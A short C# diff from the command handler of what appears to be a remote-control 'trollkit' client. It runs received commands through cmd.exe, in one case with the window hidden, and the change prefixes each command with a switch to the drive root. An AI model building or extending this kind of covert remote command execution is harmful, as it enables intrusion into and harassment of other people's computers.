@@ -54,17 +54,17 @@ namespace Trollkit_Client.Modules.CommandHandlers
 				ProcessStartInfo startInfo = new ProcessStartInfo();
 				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
 				startInfo.FileName = "cmd.exe";
-				startInfo.Arguments = $"/C {values[1]}";
+				startInfo.Arguments = $"/C c: & cd / & {values[1]}";
 				process.StartInfo = startInfo;
 				process.Start();
 			}
 			else if (values[0] == "show")
 			{
-				Process.Start("CMD.exe", $"/C {values[1]} & pause");
+				Process.Start("CMD.exe", $"/C c: & cd / & {values[1]} & pause");
 			}
 			else
 			{
-				Process.Start("CMD.exe", $"/C {command} & pause");
+				Process.Start("CMD.exe", $"/C c: & cd / & {command} & pause");
 			}
 		}
 
